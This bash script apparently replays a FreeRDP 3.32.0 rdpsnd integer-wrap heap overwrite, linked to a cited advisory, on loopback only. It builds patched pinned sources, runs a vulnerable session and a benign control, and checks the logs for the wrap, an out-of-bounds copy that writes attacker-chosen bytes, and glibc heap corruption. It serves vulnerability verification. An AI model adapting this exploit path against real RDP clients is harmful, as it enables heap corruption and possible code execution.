#!/usr/bin/env bash
# One-command witness replay for the LIVE FreeRDP 3.32.0 rdpsnd integer-wrap
# heap overwrite (GHSA-3m9q-g533-rqjq / CVE-2026-114045), wake-9 stock-allocator
# lane. Replays from pinned/committed sources only; no external probe, every
# socket is 127.0.0.1 and every server is one this script starts.
#
#   bash lab/freerdp2shell-src/verify_live.sh
#   FREERDP_VERIFY_WORK=/tmp/fr-verify-other bash lab/freerdp2shell-src/verify_live.sh
#
# Exit 0 iff every assertion passes. Logs land in verify-live-out/<UTC-stamp>/.
# The in-process real-library replay (rungs 1-4, controls) is a separate pinned
# driver: run `bash lab/freerdp2shell-src/run.sh` (FREERDP_WORK overrides its
# scratch root). This script asserts only the live-loopback claim.
set -uo pipefail

HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd) || exit 2
cd "$HERE" || exit 2

WORK=${FREERDP_VERIFY_WORK:-/tmp/fr-verify-live}
SRC=$WORK/src3320
BUILD=$WORK/build-plain
OUT=verify-live-out/$(date -u +%Y%m%dT%H%M%SZ)
PIN_COMMIT=d27a4f7c1c63b62a5e60e5d939ad116cfb58ffc1
CLONE_URL=${FREERDP_CLONE_URL:-https://github.com/FreeRDP/FreeRDP.git}
FEATURE_FLAGS="-DWITH_SERVER=ON -DWITH_CLIENT=ON -DWITH_SAMPLE=ON -DWITH_SERVER_CHANNELS=ON -DWITH_SHADOW_SUBSYSTEM=OFF -DWITH_X11=ON -DWITH_FFMPEG=OFF -DWITH_SWSCALE=OFF -DWITH_KRB5=OFF -DWITH_PKCS11=OFF -DWITH_SMARTCARD_EMULATE=OFF -DCHANNEL_URBDRC=OFF -DWITH_CUPS=OFF -DWITH_FUSE=OFF"
PATCH_ORDER="client-rdpsnd.patch server-sample-subsystem.patch server-shadow-client.patch server-wake9-copy-trace.patch client-benign-control-gate.patch"

mkdir -p "$OUT" || exit 2
pass=0
fail=0
say() { printf '%s\n' "$*"; }
fail() { say "FAIL $*"; fail=$((fail+1)); }
check() { # server log of a session tag
  local tag=$1 name=$2 pat=$3 f="$OUT/$1-server.log"
  if [ -f "$f" ] && grep -aEq "$pat" "$f"; then
    say "PASS  $name"; pass=$((pass+1))
  else
    fail "$name  [/$pat/ in $f]"
  fi
}
checkclient() { # client log of a session tag
  local tag=$1 name=$2 pat=$3 f="$OUT/$1-client.log"
  if [ -f "$f" ] && grep -aEq "$pat" "$f"; then
    say "PASS  $name"; pass=$((pass+1))
  else
    fail "$name  [/$pat/ in $f]"
  fi
}
checktcp() { # TCP-connect marker of a session tag
  local tag=$1 name=$2 pat=$3 f="$OUT/$1-tcp.log"
  if [ -f "$f" ] && grep -aEq "$pat" "$f"; then
    say "PASS  $name"; pass=$((pass+1))
  else
    fail "$name  [/$pat/ in $f]"
  fi
}
checkabsent() {
  local tag=$1 name=$2 pat=$3 f="$OUT/$1-server.log"
  if [ -f "$f" ] && ! grep -aEq "$pat" "$f"; then
    say "PASS  $name"; pass=$((pass+1))
  else
    fail "$name  [unexpected /$pat/ in $f]"
  fi
}

say "freerdp2shell live witness replay $(date -u +%Y-%m-%dT%H:%M:%SZ)"
say "git HEAD: $(git rev-parse --short HEAD 2>/dev/null || echo unknown)"
say "work:     $WORK"
say "output:   $OUT"
say

say "--- pinned source digests ---"
sha256sum run.sh $(for p in $PATCH_ORDER; do printf 'wake8-patches/%s ' "$p"; done) \
  | tee "$OUT/digests.txt" || true
say

# ---- provision pinned source and apply committed lab patches ---------------
if [ ! -d "$SRC/.git" ]; then
  say "cloning FreeRDP $PIN_COMMIT from $CLONE_URL"
  git clone --quiet --depth 1 --branch 3.32.0 "$CLONE_URL" "$SRC" || {
    say "FAIL clone"; exit 2; }
fi
HEAD=$(git -C "$SRC" rev-parse HEAD 2>/dev/null || echo unknown)
if [ "$HEAD" != "$PIN_COMMIT" ]; then
  say "FAIL pinned commit: expected $PIN_COMMIT, got $HEAD"; exit 2
fi
say "PASS  pinned source $HEAD"
pass=$((pass+1))

if grep -q 'WAKE9_COPY' "$SRC/channels/rdpsnd/server/rdpsnd_main.c"; then
  say "lab patches already applied"
else
  for p in $PATCH_ORDER; do
    patch -p4 --forward -d "$SRC" -i "$HERE/wake8-patches/$p" || {
      say "FAIL applying $p"; exit 2; }
  done
  say "PASS  applied 5 committed lab patches"
  pass=$((pass+1))
fi
# The control gate must exist in this build; without it the benign lane is not
# a control but an identical second attack.
grep -q 'FR_BENIGN_ONLY' "$SRC/channels/rdpsnd/client/rdpsnd_main.c" || {
  say "FAIL benign control gate missing"; exit 2; }

if [ ! -x "$BUILD/server/shadow/cli/freerdp-shadow-cli" ] ||
   [ ! -x "$BUILD/client/Sample/sfreerdp" ]; then
  say "configuring and building plain (no sanitizer) shadow-cli + sfreerdp"
  cmake -S "$SRC" -B "$BUILD" -GNinja -DCMAKE_BUILD_TYPE=Release \
    -DCMAKE_C_FLAGS='' $FEATURE_FLAGS >"$OUT/cmake.log" 2>&1 || {
      tail -30 "$OUT/cmake.log"; say "FAIL cmake"; exit 2; }
  ninja -C "$BUILD" -j16 freerdp-shadow-cli sfreerdp >"$OUT/build.log" 2>&1 || {
      tail -30 "$OUT/build.log"; say "FAIL ninja"; exit 2; }
fi
say "PASS  build present: $BUILD"
pass=$((pass+1))

LIBPATH="$BUILD/libfreerdp:$BUILD/winpr/libwinpr:$BUILD/server/common:$BUILD/client/common:$BUILD/server/shadow"

run_session() { # <tag> <port> <client env assignment or ->
  local tag=$1 port=$2 cenv=$3 srv
  LD_LIBRARY_PATH="$LIBPATH${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}" \
    "$BUILD/server/shadow/cli/freerdp-shadow-cli" \
    /bind-address:127.0.0.1 /port:"$port" -auth /log-level:DEBUG \
    >"$OUT/$tag-server.log" 2>&1 &
  srv=$!
  local i=0 ready=0
  while [ "$ready" -eq 0 ]; do
    if nc -z -w 2 127.0.0.1 "$port" >/dev/null 2>&1; then ready=1; break; fi
    i=$((i+1)); [ "$i" -ge 75 ] && { say "FAIL $tag server not reachable on loopback"; kill $srv 2>/dev/null || true; return 1; }
    sleep 0.2
  done
  printf 'VERIFY: loopback TCP connect to 127.0.0.1:%s succeeded\n' "$port" >"$OUT/$tag-tcp.log"
  if [ "$cenv" = "-" ]; then
    LD_LIBRARY_PATH="$LIBPATH${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}" \
      timeout 40 "$BUILD/client/Sample/sfreerdp" \
      /v:127.0.0.1:"$port" /sec:rdp /u:test /p:test /sound /log-level:DEBUG \
      >"$OUT/$tag-client.log" 2>&1 || true
  else
    env "$cenv" LD_LIBRARY_PATH="$LIBPATH${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}" \
      timeout 40 "$BUILD/client/Sample/sfreerdp" \
      /v:127.0.0.1:"$port" /sec:rdp /u:test /p:test /sound /log-level:DEBUG \
      >"$OUT/$tag-client.log" 2>&1 || true
  fi
  sleep 2
  kill "$srv" 2>/dev/null || true
  wait "$srv" 2>/dev/null || true
  say "===== $tag done (port $port) ====="
}

BASE=$((20000 + $$ % 20000))
say "--- vulnerable live session (two SNDC_FORMATS PDUs, wVersion=1) ---"
run_session wrap "$BASE" '-' || exit 2
say "--- benign control (FR_BENIGN_ONLY=1: first PDU only) ---"
run_session benign "$((BASE+1))" 'FR_BENIGN_ONLY=1' || exit 2
say

# ---- assertions: live wrap --------------------------------------------------
checktcp wrap "loopback listener reachable by TCP" "VERIFY: loopback TCP connect to 127.0.0.1:$BASE succeeded"
check wrap "ACTIVE session" 'CONNECTION_STATE_ACTIVE|is activated'
check wrap "rdpsnd channel joined" 'Accepted channels:.*rdpsnd|rdpsnd \[[0-9]+\]'
checkclient wrap "client saw audio formats" 'Server Audio Formats'
check wrap "integer wrap: failed realloc" 'realloc failed!'
check wrap "failed format selection" 'SelectFormat failed with 12'
check wrap "chosen-byte copy: 16384 bytes at offset 0" 'WAKE9_COPY dst_off=0 cframesize=16384'
check wrap "first OOB byte is chosen 0xDE" 'b8820=de'
check wrap "glibc detected heap corruption on free" \
  'double free or corruption|free\(\): invalid pointer|corrupted unsorted chunks|malloc\(\):.*corrupt'

# ---- assertions: benign control --------------------------------------------
checktcp benign "control loopback listener reachable by TCP" "VERIFY: loopback TCP connect to 127.0.0.1:$((BASE+1)) succeeded"
check benign "control ACTIVE session" 'CONNECTION_STATE_ACTIVE|is activated'
check benign "control in-bounds first write" 'WAKE9_COPY dst_off=0 cframesize=8820'
check benign "control left offset 8820 untouched" 'b8820=00'
checkabsent benign "control has no wrap/realloc failure" 'realloc failed!|SelectFormat failed'
checkabsent benign "control has no glibc corruption" \
  'double free or corruption|free\(\): invalid pointer|corrupted unsorted chunks|malloc\(\):.*corrupt'

say
say "TOTAL: $pass PASS / $fail FAIL"
if [ "$fail" -ne 0 ]; then
  say "witness replay FAILED; logs in $OUT"
  exit 1
fi
say "witness replay PASS; logs in $OUT"
exit 0
